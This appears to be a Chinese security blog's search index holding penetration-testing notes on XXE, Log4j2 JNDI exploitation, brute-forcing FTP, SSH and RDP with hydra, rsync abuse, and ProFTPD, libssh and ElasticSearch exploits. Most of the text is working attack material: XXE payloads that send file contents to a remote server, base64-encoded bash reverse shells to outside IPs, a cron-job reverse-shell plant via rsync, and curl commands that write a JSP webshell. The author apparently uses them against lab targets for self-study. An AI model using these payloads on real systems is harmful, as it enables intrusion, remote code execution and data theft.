<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/04/10/xml-xxe-wu-hui-xian-dtd-shi-ti-wei-xie-yi-dai-ma-shen-ji/"/>
      <url>/2022/04/10/xml-xxe-wu-hui-xian-dtd-shi-ti-wei-xie-yi-dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<h4 id="XML-amp-XXE-amp-无回显-amp-DTD实体-amp-伪协议-amp-代码审计"><a href="#XML-amp-XXE-amp-无回显-amp-DTD实体-amp-伪协议-amp-代码审计" class="headerlink" title="XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计"></a><strong>XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计</strong></h4><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><p>客户端：xml发送数据</p><p>服务端：xml解析数据</p><p>利用xml写一个带有文件读取的代码尝试发送，类似文件读取功能实现</p><p>无回显：要利用带外测试（利用dnslog来做测试！） </p><p>实体引用：引用远程的evil2.dtd文件</p><h5 id="1-解决拦截防护绕过问题"><a href="#1-解决拦截防护绕过问题" class="headerlink" title="1.解决拦截防护绕过问题"></a>1.解决拦截防护绕过问题</h5><pre><code>&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM "http://127.0.0.1:8081/evil2.dtd"&gt;​    %file;]&gt;&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</code></pre><p>evil2.dtd ：该文件读取d:e.txt的内容</p><pre><code>&lt;!ENTITY send SYSTEM "file:///d:/e.txt"&gt;##### 2.解决数据不回显的问题</code></pre><pre><code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM "file:///d:/e.txt"&gt;&lt;!ENTITY % remote SYSTEM "http://47.109.33.184/test.dtd"&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt;</code></pre><p>test.dtd</p><pre><code>&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://47.109.33.184/get.php?file=%file;'&gt;"&gt;</code></pre><h5 id="XXE黑盒发现："><a href="#XXE黑盒发现：" class="headerlink" title="XXE黑盒发现："></a>XXE黑盒发现：</h5><p>1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</p><p>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</p><p>流程：功能分析-前端提交-源码&amp;抓包-构造Paylod测试</p><p>更改请求数据格式：Content-Type</p><h5 id="XXE白盒发现："><a href="#XXE白盒发现：" class="headerlink" title="XXE白盒发现："></a>XXE白盒发现：</h5><p>1、可通过应用功能追踪代码定位审计</p><p>2、可通过脚本特定函数搜索定位审计</p><p>3、可通过伪协议玩法绕过相关修复等</p><h5 id="XXE修复防御方案："><a href="#XXE修复防御方案：" class="headerlink" title="XXE修复防御方案："></a>XXE修复防御方案：</h5><p>-方案1-禁用外部实体</p><p>PHP:</p><p>libxml_disable_entity_loader(true);</p><p>JAVA:</p><p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</p><p>Python：</p><p>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><p>-方案2-过滤用户提交的XML数据</p><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/04/05/log4j2-lou-dong-fu-xian/"/>
      <url>/2022/04/05/log4j2-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="log4j2漏洞复现"><a href="#log4j2漏洞复现" class="headerlink" title="log4j2漏洞复现"></a>log4j2漏洞复现</h1><p> 最近的特大漏洞log4j2的出现，也是掀起了安全圈的一个风暴呀，自己也尝试着来复现一下吧，毕竟慢慢成长嘛。</p><p>漏洞描述Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。鉴于此漏洞危害较大，建议客户尽快采取措施防护此漏洞影响版本Apache Log4j 2.x &lt; 2.15.0-rc2</p><p>下面直接开始复现</p><p>现在虚拟机上面拉个Java环境，这样方便嘛</p><p>直接执行代码docker pull vulfocus/log4j2-rce-2021-12-09:latest</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203247.png"></p><p>然后docker images 观看是那个镜像文件，把它跑起来</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203257.png"></p><p>直接docker run -d -P vulfocus/log4j2-rce-2021-12-09  然后看这个跑起来的虚拟机的那个端口号映射到了本虚拟机的端口号docker ps</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203313.png"></p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203320.png"></p><p>然后就直接访问这个网页是否搭建成功 直接访问192.168.227.128：49153   192.168.227.128是我kali虚拟机的ip</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203336.png"></p><p>然后就要先检测这个网页是否纯在log4j2这个漏洞，直接上bp。这里要主要箭头的地方，直接构造的payload要使用自己ceye上的payload=${jndi:ldap://zzz.yqy3cn.ceye.io} 前面的二级域名随便写什么，不写也可以。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203344.png"></p><p>然后在ceye.io上出现了这个以后，就代表纯在这个log4j2漏洞。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203356.png"></p><p>现在就到了最刺激的一步了，直接来弹shell吧。。</p><p>首先我们要启动一个idap服务，那就去github（JNDI-Injection-Exploit）上面下载吧。下载完成后在本地执行命令</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMjI2LjY3Lzk5OTkgMD4mMQ}|{base64,-d}|{bash,-i}”-A “xxxxx(执行这个命令的本机ip)”</p><p>当然我这里是在自己的服务器上执行的，都可以看感觉吧 哈哈哈</p><p>先把这个文件提到我的服务器上面去</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203404.png"></p><p>然后直接执行命令哇，但是这里要注意写进去的shell命令要编码喔，否则不行。</p><p>bash -i &gt;&amp; /dev/tcp/120.25.208.59/6363 0&gt;&amp;1 直接反弹到自己的服务区上面去。在<a href="https://www.jackson-t.ca/runtime-exec-payloads.html%E7%BC%96%E7%A0%81%E5%90%8E%E4%B8%BA">https://www.jackson-t.ca/runtime-exec-payloads.html编码后为</a></p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjUuMjA4LjU5LzYzNjMgMD4mMQ==}|{base64,-d}|{bash,-i}</p><p>然后在服务器上面执行那个命令</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203419.png"></p><p>然后将这个放到bp上面执行，在自己的服务起上面监听6363端口</p><p>payload=${jndi:ldap://baidu.ehlf5h.ceye.io}</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203427.png"></p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203434.png"></p><p>然后就直接拿到shell,完成复现。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203441.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</title>
      <link href="/2020/01/14/ying-yong-xie-yi-rsync-ssh-rdp-ftp-lou-dong-pi-sao-kou-ling-cai-jie/"/>
      <url>/2020/01/14/ying-yong-xie-yi-rsync-ssh-rdp-ftp-lou-dong-pi-sao-kou-ling-cai-jie/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h2 id="应用协议-amp-Rsync-amp-SSH-amp-RDP-amp-FTP-amp-漏洞批扫-amp-口令猜解"><a href="#应用协议-amp-Rsync-amp-SSH-amp-RDP-amp-FTP-amp-漏洞批扫-amp-口令猜解" class="headerlink" title="应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解"></a>应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</h2><h4 id="用hydra爆破（弱口令爆破）"><a href="#用hydra爆破（弱口令爆破）" class="headerlink" title="用hydra爆破（弱口令爆破）"></a>用hydra爆破（弱口令爆破）</h4><p>FTP（端口：21）：文本传输协议  （用户名随机）</p><p>RDP（端口：3389）,SSH（端口：22）：windows,linux上的远程传输协议</p><p>RDP用户名（一般是administrator） SSH用户名(一般是root)</p><p>hydra是一个自动化的爆破工具，暴力破解弱密码，</p><p>用hydra爆破</p><pre><code>-s PORT 可通过这个参数指定非默认端口。-l LOGIN 指定破解的用户，对特定用户破解。-L FILE 指定用户名字典。-p PASS 小写，指定密码破解，少用，一般是采用密码字典。-P FILE 大写，指定密码字典。-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。-M FILE 指定目标列表文件一行一条。-o FILE 指定结果输出文件。-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。-t TASKS 同时运行的线程数，默认为16。-w TIME 设置最大超时的时间，单位秒，默认是30s。-v / -V 显示详细过程。</code></pre><pre><code>hydra -L test -P 10top1K.txt 目标IP ftp -Vhydra -l root -P 10top1K.txt 目标IP ssh -Vhydra -l administrator -P 10top1K.txt 目标IP rdp -V</code></pre><p>L： 指定用户名字典   l：指定用户名  P：指定密码字典</p><h4 id="Rsync文件备份（未授权访问）"><a href="#Rsync文件备份（未授权访问）" class="headerlink" title="Rsync文件备份（未授权访问）"></a>Rsync文件备份（未授权访问）</h4><p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p><pre><code>判断：rsync rsync://目标IP利用：-读取文件：rsync rsync://目标IP/src/-下载文件：rsync rsync://目标IP/src/etc/passwd ./-上传文件：rsync -av passwd rsync://目标IP/src/tmp/passwd反弹shell：1、获取信息：rsync rsync://目标IP/src/etc/crontab /root/cron.txt2.创建文件 touch shell \#!/bin/bash /bin/bash -i &gt;&amp; /dev/tcp/本地IP/5566 0&gt;&amp;1chmod +x shell        3、上传文件 rsync -av shell rsync://目标IP/src/etc/cron.hourly 4、等待接受反弹</code></pre><p>利用msf:auxiliary/scanner/rsync/modules_list</p><h4 id="协议漏洞-应用软件-FTP-amp-Proftpd搭建"><a href="#协议漏洞-应用软件-FTP-amp-Proftpd搭建" class="headerlink" title="协议漏洞-应用软件-FTP&amp;Proftpd搭建"></a>协议漏洞-应用软件-FTP&amp;Proftpd搭建</h4><pre><code>https://github.com/t0kx/exploit-CVE-2015-3306python exploit.py --host 123.58.236.76 --port 24967 --path "/var/www/html/"http://123.58.236.76:19758/backdoor.php?cmd=id</code></pre><h4 id="协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh"><a href="#协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh" class="headerlink" title="协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh"></a>协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</h4><pre><code>-Openssh CVE-2014-0160 CVE-2018-15473 cve_2020_15778CVE-2014-0160 版本很少cve_2020_15778 价值不高CVE-2018-15473-用户名枚举https://github.com/Rhynorater/CVE-2018-15473-Exploitpip3 install -r requirements.txtpip3 install paramiko==2.4.1python sshUsernameEnumExploit.py --port 32013 --userList exampleInput.txt 123.58.236.76</code></pre><h4 id="libssh-身份验证绕过（CVE-2018-10933）"><a href="#libssh-身份验证绕过（CVE-2018-10933）" class="headerlink" title="libssh 身份验证绕过（CVE-2018-10933）"></a>libssh 身份验证绕过（CVE-2018-10933）</h4><pre><code>https://www.seebug.org/vuldb/ssvid-97614python libssh.py 123.58.236.76 55190 "id"</code></pre>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务攻防——数据库类型安全</title>
      <link href="/2020/01/14/fu-wu-gong-fang-shu-ju-ku-lei-xing-an-quan/"/>
      <url>/2020/01/14/fu-wu-gong-fang-shu-ju-ku-lei-xing-an-quan/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h4 id="服务攻防——数据库类型安全"><a href="#服务攻防——数据库类型安全" class="headerlink" title="服务攻防——数据库类型安全"></a>服务攻防——数据库类型安全</h4><p>1.influxdb-未授权访问-jwt验证</p><p>2.H2database-未授权访问-配置不当</p><p>3.CouchDB-权限绕过配合RCE-漏洞</p><p>4.ElasticSearch-文件写入&amp;RCE-漏洞</p><h5 id="1-influxdb-未授权访问-jwt验证"><a href="#1-influxdb-未授权访问-jwt验证" class="headerlink" title="1.influxdb-未授权访问-jwt验证"></a>1.influxdb-未授权访问-jwt验证</h5><p> 该数据库的默认端口：8086  8088</p><p>influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。 借助jwt.io来生成jwt token</p><h5 id="2-H2-database-未授权访问-配置不当"><a href="#2-H2-database-未授权访问-配置不当" class="headerlink" title="2.H2 database-未授权访问-配置不当"></a>2.H2 database-未授权访问-配置不当</h5><p>默认端口：20051</p><p>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：默认端口：</p><pre><code>spring.h2.console.enabled=true spring.h2.console.settings.web-allow-others=true </code></pre><p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p><h5 id="3-CouchDB-权限绕过配合RCE-漏洞"><a href="#3-CouchDB-权限绕过配合RCE-漏洞" class="headerlink" title="3.CouchDB-权限绕过配合RCE-漏洞"></a>3.CouchDB-权限绕过配合RCE-漏洞</h5><p>默认端口：5984</p><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）</p><p>CouchDB-权限绕过-CVE-2017-12635</p><h5 id="4-ElasticSearch-文件写入-amp-RCE-漏洞"><a href="#4-ElasticSearch-文件写入-amp-RCE-漏洞" class="headerlink" title="4.ElasticSearch-文件写入&amp;RCE-漏洞"></a>4.ElasticSearch-文件写入&amp;RCE-漏洞</h5><p>Elasticsearch 文件写入 wooyun_2015_110216</p><p>9200一般为ElasticSearch的常用端口，此漏洞环境需要与中间件使用</p><p>1、发现9200端口存在elasticsearch页面，8080存在tomcat目录</p><p>2、利用ElasticSearch写入后门到/usr/local/tomcat/webapps/wwwroot/</p><pre><code>curl -XPOST http://123.58.236.76:31556/yz.jsp/yz.jsp/1 -d'{"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;":"test"}'curl -XPUT 'http://123.58.236.76:31556/_snapshot/yz.jsp' -d '{​     "type": "fs",​     "settings": {​          "location": "/usr/local/tomcat/webapps/wwwroot/",​          "compress": false​     }}'curl -XPUT "http://123.58.236.76:31556/_snapshot/yz.jsp/yz.jsp" -d '{​     "indices": "yz.jsp",​     "ignore_unavailable": "true",​     "include_global_state": false}'</code></pre><p>3、访问8080端口snapshot-yz.jsp文件写入代码到test.jsp中</p><pre><code>http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=successhttp://123.58.236.76:31557/wwwroot/test.jsp</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
